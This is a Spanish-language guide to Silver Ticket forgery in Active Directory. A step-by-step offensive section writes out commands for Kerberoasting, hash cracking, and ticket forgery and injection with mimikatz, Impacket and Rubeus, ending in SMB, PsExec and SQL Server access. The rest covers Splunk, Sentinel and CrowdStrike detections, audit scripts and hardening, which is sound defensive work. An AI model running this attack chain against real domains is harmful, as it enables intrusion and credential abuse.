# 🛑 Ataques de **Silver Ticket en Active Directory**

---

## 📝 ¿Qué es Silver Ticket y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica de falsificación de tickets de servicio Kerberos (TGS) que permite acceso directo a servicios específicos sin pasar por el Domain Controller. Utiliza el hash NTLM de cuentas de servicio para crear tickets válidos hacia servicios específicos. |
| **Finalidad** | Acceso directo y persistente a servicios específicos (CIFS, HTTP, MSSQL, etc.) sin necesidad de TGT válido. Más sigiloso que Golden Ticket ya que no requiere contacto con el DC y es más difícil de detectar. |

---

## 📈 Elementos críticos para Silver Ticket

| Requisito | Descripción | Obtención |
|-----------|-------------|-----------|
| **Service Hash** | Hash NTLM de la cuenta que ejecuta el servicio objetivo | Kerberoasting, LSA Secrets, SAM/NTDS.dit |
| **Domain SID** | Security Identifier del dominio | `Get-ADDomain`, `whoami /user`, LDAP queries |
| **Target SPN** | Service Principal Name del servicio objetivo | `setspn -T domain -Q */*`, BloodHound, LDAP enumeration |
| **Service FQDN** | Nombre completo del servidor que hospeda el servicio | DNS resolution, network enumeration |

> **⚠️ ALERTA CRÍTICA**: Silver Tickets son válidos hasta que se cambie la contraseña de la cuenta de servicio específica. No se invalidan con rotación de krbtgt como los Golden Tickets.

### SPNs comúnmente explotados:

```
CIFS/server.domain.com     -> Acceso a archivos SMB
HTTP/webapp.domain.com     -> Aplicaciones web IIS
MSSQL/db.domain.com        -> SQL Server databases  
HOST/server.domain.com     -> Administración remota (RDP, PSExec)
LDAP/dc.domain.com         -> Directory services access
WSMAN/server.domain.com    -> PowerShell remoting
```

---

## 🛠️ ¿Cómo funciona y cómo se explota Silver Ticket? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **Kerberoasting para hash de servicio** | Extrae hashes TGS de cuentas de servicio para posterior cracking offline. |
| **Machine Account Silver Ticket** | Usa hash de cuenta de máquina ($) para crear tickets hacia servicios en ese host. |
| **Service Account Compromise** | Compromete cuenta de servicio y usa su hash para Silver Tickets hacia sus SPNs. |
| **Cross-Service Silver Ticket** | Crea tickets para diferentes servicios usando el mismo hash de cuenta. |
| **CIFS Silver Ticket** | Acceso completo a archivos SMB sin autenticación interactiva. |
| **HTTP Silver Ticket** | Acceso a aplicaciones web bypassing autenticación normal. |
| **MSSQL Silver Ticket** | Acceso directo a bases de datos SQL Server con permisos del servicio. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Enumerar SPNs para Kerberoasting
GetUserSPNs.py -request -dc-ip 10.10.10.100 domain.com/user:password

# 2. Crackear hash TGS obtenido
hashcat -m 13100 service_ticket.hash rockyou.txt

# 3. Obtener Domain SID
rpcclient -U "domain.com/user%password" 10.10.10.100 -c "lsaquery"

# 4. Crear Silver Ticket para CIFS con mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-987654321-1122334455 /target:server.domain.com /service:CIFS /rc4:a9b30e5b0dc865eadcea9411e4ade72d /ticket:silver_cifs.kirbi

# 5. Crear Silver Ticket para HTTP con mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-987654321-1122334455 /target:webapp.domain.com /service:HTTP /rc4:a9b30e5b0dc865eadcea9411e4ade72d /ticket:silver_http.kirbi

# 6. Silver Ticket con Impacket ticketer.py
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-987654321-1122334455 -domain domain.com -spn CIFS/server.domain.com Administrator

# 7. Inyectar ticket CIFS en memoria
kerberos::ptt silver_cifs.kirbi

# 8. Acceder a archivos con ticket inyectado
dir \\server.domain.com\C$

# 9. Silver Ticket para cuenta de máquina (formato especial)
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-987654321-1122334455 /target:server.domain.com /service:HOST /rc4:machine_account_hash /ticket:silver_host.kirbi

# 10. Usar ticket para PSExec
impacket-psexec -k -no-pass domain.com/Administrator@server.domain.com

# 11. Silver Ticket para MSSQL
impacket-ticketer -nthash service_hash -domain-sid S-1-5-21-1234567890-987654321-1122334455 -domain domain.com -spn MSSQL/db.domain.com Administrator

# 12. Acceso a SQL Server con ticket
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass domain.com/Administrator@db.domain.com

# 13. Silver Ticket con Rubeus
.\Rubeus.exe silver /service:CIFS/server.domain.com /rc4:a9b30e5b0dc865eadcea9411e4ade72d /sid:S-1-5-21-1234567890-987654321-1122334455 /ldap /user:Administrator /domain:domain.com /ptt
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- Silver Tickets proporcionan acceso directo a servicios críticos sin detección por DCs
- Compromiso de una sola cuenta de servicio puede resultar en acceso persistente a múltiples recursos
- Detección compleja debido a naturaleza local de la validación de tickets TGS
- Costo estimado por compromiso de servicios críticos: $800,000 USD promedio

**Valor de la detección:**
- Identificación de accesos anómalos a servicios sin autenticación previa en DC
- Detección de patrones de uso de tickets TGS sospechosos
- Prevención de acceso no autorizado a servicios críticos en 85% de casos
- Cumplimiento con controles de acceso granular y Zero Trust

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.2+ con capacidad para logs de servicios
- Universal Forwarders en servidores críticos con servicios
- Sysmon v14+ en servidores de aplicaciones y bases de datos
- Auditoría de acceso a objetos habilitada en servicios críticos
- Baseline de patrones de acceso legítimos a servicios

**Arquitectura de datos:**
```
[Application Servers] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                      ↓                     ↓
[EventCode 4769/5140]  [WinEventLog:Security]   [Index: wineventlog]
[Service Access Logs]        ↓                      ↓
[Authentication Patterns] [Real-time processing] [Silver Ticket Alerting]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 75 min)

1. **Habilitar auditoría de servicios críticos:**
   ```powershell
   # En servidores con servicios críticos
   auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
   auditpol /set /subcategory:"File Share" /success:enable /failure:enable
   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
   
   # Para servicios web (IIS)
   auditpol /set /subcategory:"Object Access" /success:enable /failure:enable
   ```

2. **Crear baseline de accesos legítimos:**
   ```splunk
   index=wineventlog EventCode=4769 earliest=-30d@d latest=@d
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | stats count by AccountName, ServiceName, ClientAddress
   | where count > 10
   | outputlookup service_access_baseline.csv
   ```

#### Fase 2: Implementación de detecciones críticas (Tiempo estimado: 100 min)

1. **Alerta CRÍTICA - TGS sin TGT previo:**
   ```splunk
   index=wineventlog EventCode=4769
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | join type=left AccountName [
     search index=wineventlog EventCode=4768 earliest=-1h
     | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
     | eval has_tgt=1
   ]
   | where isnull(has_tgt)
   | eval severity="CRITICAL", technique="Silver Ticket - TGS without TGT"
   | eval risk_score=95
   | table _time, ComputerName, AccountName, ServiceName, ClientAddress, severity, risk_score
   ```

2. **Alerta ALTA - Acceso anómalo a servicios críticos:**
   ```splunk
   index=wineventlog EventCode=5140 OR EventCode=4769
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
   | rex field=Message "Share Name:\s+(?<ShareName>[^\s]+)"
   | where ServiceName IN ("CIFS*", "HTTP*", "MSSQL*", "LDAP*") OR ShareName IN ("C$", "ADMIN$", "IPC$")
   | lookup service_access_baseline.csv AccountName, ServiceName
   | where isnull(count)
   | eval severity="HIGH", technique="Anomalous Service Access"
   | eval risk_score=80
   | table _time, ComputerName, AccountName, ServiceName, ShareName, severity, risk_score
   ```

3. **Alerta MEDIA - Múltiples servicios desde misma fuente:**
   ```splunk
   index=wineventlog EventCode=4769
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | stats dc(ServiceName) as unique_services values(ServiceName) as services by AccountName, ClientAddress, _time
   | where unique_services > 5
   | eval severity="MEDIUM", technique="Multiple Service Access Pattern"
   | eval risk_score=70
   | table _time, AccountName, ClientAddress, unique_services, services, severity, risk_score
   ```

#### Fase 3: Dashboard crítico y validación (Tiempo estimado: 60 min)

1. **Dashboard de monitoreo crítico:**
   ```xml
   <dashboard>
     <label>Critical: Silver Ticket Detection</label>
     <row>
       <panel>
         <title>🚨 CRITICAL: TGS without TGT (Silver Ticket Pattern)</title>
         <table>
           <search refresh="120s">
             <query>
               index=wineventlog EventCode=4769 earliest=-1h
               | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)"
               | rex field=Message "Service Name:\s+(?&lt;ServiceName&gt;[^\s]+)"
               | join type=left AccountName [search index=wineventlog EventCode=4768 earliest=-2h | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)" | eval has_tgt=1]
               | where isnull(has_tgt)
               | table _time, ComputerName, AccountName, ServiceName, ClientAddress
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

### ✅ Criterios de éxito

**Métricas críticas:**
- MTTD para TGS sin TGT: < 10 minutos (CRÍTICO)
- MTTD para accesos anómalos a servicios: < 20 minutos
- Tasa de falsos positivos: < 5% (servicios con patrones irregulares)
- Cobertura de servicios monitoreados: 100% (servicios críticos)

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4769**            | Solicitud TGS - crítico para detectar Silver Tickets sin TGT previo.        |
| **EventCode = 5140**            | Acceso a share de red - detectar accesos CIFS anómalos.                     |
| **EventCode = 4648**            | Explicit credential use - puede indicar uso de Silver Ticket.                |
| **Service Name**                | SPN solicitado - CIFS, HTTP, MSSQL son críticos.                           |
| **Account Name**                | Usuario que solicita - correlacionar con TGTs previos.                       |
| **Client Address**              | IP origen - detectar patrones geográficos anómalos.                          |
| **Ticket Options**             | Opciones del ticket - detectar configuraciones de Silver Ticket.             |

### Query Splunk: Detección de Silver Ticket sin TGT

```splunk
index=wineventlog EventCode=4769
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
| rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
| join type=left AccountName [
  search index=wineventlog EventCode=4768 earliest=-2h
  | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
  | eval has_recent_tgt=1
]
| where isnull(has_recent_tgt) AND ServiceName!="krbtgt"
| eval alert_type="CRITICAL - Possible Silver Ticket"
| table _time, ComputerName, AccountName, ServiceName, ClientAddress, alert_type
```

### Query: Accesos CIFS administrativos sospechosos

```splunk
index=wineventlog EventCode=5140
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Share Name:\s+(?<ShareName>[^\s]+)"
| rex field=Message "Source Address:\s+(?<SourceAddress>[^\s]+)"
| where ShareName IN ("C$", "ADMIN$", "IPC$")
| stats count by AccountName, ShareName, SourceAddress, _time
| where count > 1
| eval alert_type="HIGH - Administrative Share Access"
| table _time, AccountName, ShareName, SourceAddress, count, alert_type
```

### Query: Patrones de Silver Ticket para servicios web

```splunk
index=iis OR index=wineventlog EventCode=4769
| where (index="wineventlog" AND Message LIKE "%Service Name: HTTP%") OR (index="iis")
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
| stats count by AccountName, ServiceName, src_ip
| where count > 10
| eval alert_type="MEDIUM - Excessive HTTP Service Access"
| table AccountName, ServiceName, src_ip, count, alert_type
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Silver Ticket - TGS sin TGT previo
SecurityEvent
| where EventID == 4769 // TGS request
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ServiceName = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
| extend ClientAddress = extract(@"Client Address:\s+([^\s]+)", 1, EventData)
| where ServiceName != "krbtgt"
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4768 // TGT request
    | extend TGTAccount = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
    | where TimeGenerated > ago(2h)
    | project TGTAccount, TimeGenerated
) on $left.AccountName == $right.TGTAccount
| project TimeGenerated, Computer, AccountName, ServiceName, ClientAddress
| extend AlertType = "CRITICAL - Silver Ticket Suspected"
```

```kql
// Accesos administrativos anómalos con Silver Ticket
SecurityEvent
| where EventID == 5140 // File share accessed
| extend ShareName = extract(@"Share Name:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| where ShareName in ("C$", "ADMIN$", "IPC$")
| summarize count() by AccountName, ShareName, Computer, bin(TimeGenerated, 1h)
| where count_ > 5
| extend AlertType = "HIGH - Excessive Administrative Access"
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **TGS without TGT** | Solicitud TGS sin TGT previo (patrón Silver Ticket) | Crítica |
| **Admin Share Abuse** | Acceso excesivo a shares administrativos | Alta |
| **Service Hopping** | Acceso a múltiples servicios desde misma fuente | Media |
| **Off-hours Service Access** | Acceso a servicios fuera de horario laboral | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de Silver Ticket - TGS sin TGT
event_platform=Win event_simpleName=KerberosLogon
| search ServiceName!=krbtgt
| join type=left ComputerName UserName [
  search event_platform=Win event_simpleName=KerberosLogon ServiceName=krbtgt
  | eval has_tgt=1
  | stats latest(has_tgt) as has_recent_tgt by ComputerName, UserName
]
| where isnull(has_recent_tgt)
| table _time, ComputerName, UserName, ServiceName, ClientAddress
| sort - _time
```

```sql
-- Detección de accesos CIFS sospechosos
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort=445
| join ComputerName [
  search event_platform=Win event_simpleName=ProcessRollup2 ImageFileName=*smb*
  | table ComputerName, ProcessId
]
| stats count by ComputerName, RemoteAddressIP4, UserName
| where count > 20
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección principal de Silver Ticket

```kql
// Query principal para detectar Silver Tickets
SecurityEvent
| where EventID == 4769 // TGS request
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ServiceName = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
| extend ClientAddress = extract(@"Client Address:\s+([^\s]+)", 1, EventData)
| where ServiceName != "krbtgt"
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4768 // TGT request
    | extend TGTAccount = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
    | where TimeGenerated > ago(2h)
    | project TGTAccount
) on $left.AccountName == $right.TGTAccount
| extend AlertLevel = "CRITICAL", AttackType = "Silver Ticket - TGS without TGT"
| project TimeGenerated, Computer, AccountName, ServiceName, ClientAddress, AlertLevel, AttackType
```

### Hunting avanzado

```kql
// Correlación: Kerberoasting + Silver Ticket
SecurityEvent
| where EventID == 4769 // TGS request
| extend RequestedSPN = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
| join kind=inner (
    SecurityEvent
    | where EventID == 4769
    | extend RequestTime = TimeGenerated
    | extend ServiceAccount = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
) on $left.RequestedSPN == $right.ServiceAccount
| where TimeGenerated - RequestTime between (1h .. 24h)
| project TimeGenerated, Computer, AccountName, RequestedSPN
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Cambio regular de contraseñas de servicio** | Rotar credenciales de cuentas de servicio cada 90 días máximo.                                   |
| **Uso de Group Managed Service Accounts**     | Implementar gMSA para rotación automática de contraseñas.                                        |
| **Cifrado AES obligatorio**                    | Deshabilitar RC4/DES para prevenir Silver Tickets débiles.                                       |
| **Monitoring granular de servicios**          | Habilitar auditoría detallada en servicios críticos.                                            |
| **Network segmentation**                       | Aislar servicios críticos en VLANs dedicadas.                                                    |
| **Service Principal Name audit**               | Auditoría regular de SPNs registrados y eliminación de innecesarios.                            |
| **Least privilege for services**              | Ejecutar servicios con permisos mínimos necesarios.                                              |
| **PAM for service accounts**                   | Privileged Access Management para cuentas de servicio críticas.                                  |
| **Anomaly detection**                          | ML/AI para detectar patrones anómalos de acceso a servicios.                                     |
| **Service hardening**                          | Configuración segura de IIS, SQL Server, y otros servicios.                                      |

### Script de auditoría de SPNs

```powershell
# Auditoría completa de Service Principal Names
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, LastLogonDate, PasswordLastSet |
Select-Object Name, ServicePrincipalName, LastLogonDate, PasswordLastSet, @{Name='PasswordAge';Expression={(Get-Date) - $_.PasswordLastSet | Select-Object -ExpandProperty Days}} |
Where-Object {$_.PasswordAge -gt 90} |
Format-Table -AutoSize
```

---

## 🚨 Respuesta ante incidentes

1. **Identificar servicio comprometido** mediante análisis del SPN en el Silver Ticket.
2. **Cambiar contraseña inmediatamente** de la cuenta de servicio afectada.
3. **Revisar logs de acceso** al servicio en las últimas 48 horas.
4. **Analizar método de compromiso** inicial de la cuenta de servicio.
5. **Validar integridad** de datos y sistemas accedidos.
6. **Implementar monitoreo reforzado** del servicio afectado.
7. **Revisar configuraciones** de otros servicios similares.
8. **Documentar IOCs** y TTPs utilizados para prevención futura.

---

## 🧑‍💻 ¿Cómo revisar y detectar Silver Tickets? (PowerShell)

### Enumerar cuentas de servicio vulnerables

```powershell
# Buscar cuentas con SPNs y contraseñas antiguas
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, PasswordLastSet, LastLogonDate |
Where-Object {((Get-Date) - $_.PasswordLastSet).Days -gt 90} |
Select-Object Name, ServicePrincipalName, PasswordLastSet, @{Name='DaysOld';Expression={((Get-Date) - $_.PasswordLastSet).Days}} |
Sort-Object DaysOld -Descending
```

### Detectar TGS sin TGT previo

```powershell
# Buscar solicitudes TGS sin TGT previo (patrón Silver Ticket)
$TGTUsers = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768; StartTime=(Get-Date).AddHours(-2)} |
ForEach-Object { if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } }

Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddHours(-1)} |
ForEach-Object {
    if ($_.Message -match "Account Name:\s+(\S+)" -and $_.Message -match "Service Name:\s+(\S+)") {
        $AccountName = $matches[1]
        $ServiceName = $matches[2]
        if ($AccountName -notin $TGTUsers -and $ServiceName -ne "krbtgt") {
            [PSCustomObject]@{
                TimeCreated = $_.TimeCreated
                AccountName = $AccountName
                ServiceName = $ServiceName
                Alert = "CRITICAL - Possible Silver Ticket"
            }
        }
    }
} | Format-Table -AutoSize
```

### Monitoreo de accesos administrativos

```powershell
# Monitor accesos a shares administrativos
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140; StartTime=(Get-Date).AddHours(-24)} |
Where-Object { $_.Message -match "Share Name:\s+(C\$|ADMIN\$|IPC\$)" } |
ForEach-Object {
    $ShareName = if ($_.Message -match "Share Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    $AccountName = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    $SourceAddress = if ($_.Message -match "Source Address:\s+(\S+)") { $matches[1] } else { "Unknown" }
    
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        ShareName = $ShareName
        AccountName = $AccountName
        SourceAddress = $SourceAddress
    }
} | Group-Object AccountName, ShareName | 
Where-Object { $_.Count -gt 3 } |
Select-Object Name, Count | Format-Table -AutoSize
```

### Script de auditoría completa para Silver Tickets

```powershell
# Auditoría completa de seguridad contra Silver Tickets
Write-Host "=== AUDITORÍA SILVER TICKET SECURITY ===" -ForegroundColor Red

# 1. Verificar cuentas de servicio con contraseñas antiguas
Write-Host "1. Cuentas de servicio con contraseñas antiguas:" -ForegroundColor Yellow
$VulnerableServices = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, PasswordLastSet |
Where-Object {((Get-Date) - $_.PasswordLastSet).Days -gt 90} |
Select-Object Name, ServicePrincipalName, @{Name='PasswordAge';Expression={((Get-Date) - $_.PasswordLastSet).Days}}

if ($VulnerableServices) {
    $VulnerableServices | Format-Table -AutoSize
    Write-Host "⚠️ CRÍTICO: Encontradas $(($VulnerableServices | Measure-Object).Count) cuentas de servicio vulnerables" -ForegroundColor Red
} else {
    Write-Host "✓ No se encontraron cuentas de servicio con contraseñas antiguas" -ForegroundColor Green
}

# 2. Buscar patrones de Silver Ticket recientes
Write-Host "2. Buscando patrones de Silver Ticket..." -ForegroundColor Yellow
$RecentTGTs = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768; StartTime=(Get-Date).AddHours(-2)} -ErrorAction SilentlyContinue |
ForEach-Object { if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } }

$SuspiciousTGS = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddHours(-1)} -ErrorAction SilentlyContinue |
ForEach-Object {
    if ($_.Message -match "Account Name:\s+(\S+)" -and $_.Message -match "Service Name:\s+(\S+)") {
        $AccountName = $matches[1]
        $ServiceName = $matches[2]
        if ($AccountName -notin $RecentTGTs -and $ServiceName -ne "krbtgt") {
            [PSCustomObject]@{
                Time = $_.TimeCreated
                Account = $AccountName
                Service = $ServiceName
                ClientIP = if ($_.Message -match "Client Address:\s+(\S+)") { $matches[1] } else { "Unknown" }
            }
        }
    }
}

if ($SuspiciousTGS) {
    Write-Host "⚠️ CRÍTICO: Se encontraron patrones de Silver Ticket:" -ForegroundColor Red
    $SuspiciousTGS | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron patrones sospechosos de Silver Ticket" -ForegroundColor Green
}

# 3. Verificar accesos administrativos anómalos
Write-Host "3. Verificando accesos administrativos..." -ForegroundColor Yellow
$AdminAccess = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "Share Name:\s+(C\$|ADMIN\$|IPC\$)" } |
ForEach-Object {
    $AccountName = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    $ShareName = if ($_.Message -match "Share Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    [PSCustomObject]@{
        Account = $AccountName
        Share = $ShareName
        Time = $_.TimeCreated
    }
} | Group-Object Account | Where-Object { $_.Count -gt 5 }

if ($AdminAccess) {
    Write-Host "⚠️ ADVERTENCIA: Accesos administrativos frecuentes detectados:" -ForegroundColor Yellow
    $AdminAccess | Select-Object Name, Count | Format-Table -AutoSize
} else {
    Write-Host "✓ No se detectaron accesos administrativos anómalos" -ForegroundColor Green
}

# 4. Recomendaciones
Write-Host "=== RECOMENDACIONES ===" -ForegroundColor Cyan
if ($VulnerableServices) {
    Write-Host "- Cambiar contraseñas de cuentas de servicio vulnerables INMEDIATAMENTE" -ForegroundColor Red
}
if ($SuspiciousTGS) {
    Write-Host "- Investigar inmediatamente los patrones de Silver Ticket detectados" -ForegroundColor Red
}
Write-Host "- Implementar Group Managed Service Accounts (gMSA)" -ForegroundColor Yellow
Write-Host "- Configurar alertas SIEM para detección automática" -ForegroundColor Yellow
Write-Host "- Auditar y reducir SPNs innecesarios" -ForegroundColor Yellow
}
```

---

## 📚 Referencias

- [Silver Ticket Attack - MITRE ATT&CK T1558.002](https://attack.mitre.org/techniques/T1558/002/)
- [Mimikatz Silver Ticket Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
- [Impacket ticketer.py Silver Ticket](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Microsoft - Detecting Kerberos Service Ticket Attacks](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [SANS - Silver Ticket Attack Detection](https://www.sans.org/white-papers/kerberos-attacks/)
- [Rubeus Silver Ticket](https://github.com/GhostPack/Rubeus#silver)
- [Group Managed Service Accounts - Microsoft](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [SPN Management Best Practices](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

---